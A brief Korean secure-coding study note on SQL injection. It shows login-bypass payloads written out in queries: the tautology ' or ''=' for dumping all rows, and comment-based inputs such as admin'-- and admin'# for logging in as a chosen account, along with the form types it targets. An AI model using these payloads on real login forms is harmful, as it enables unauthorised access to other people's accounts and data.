# SQL Injection

Class: Secure Coding
Created: Mar 12, 2020 2:43 PM
Reviewed: No
Type: SQL injection

## 쿼리 조작

---

### (전체 데이터 조회)
select * from table 
where id= '**' or ''='**' and pw='**' or ''='**'

### (특정 사용자 계정으로 로그인)
select * from table 
where id= 'admin'  — and pw='[아무 값]**'**'

select * from table 
where id= 'admin'#' and pw='[아무 값]**'**'

- 주석처리(—는 언어별 상이 할 수 있음)

## 1. Form based SQL Injection

---

- 정상 수행을 목표
- (ex) 회원가입 form, 로그인 form, 검색 form 등
- 정상 로직을 우회하여 정상 수행
- '**' or ''='**'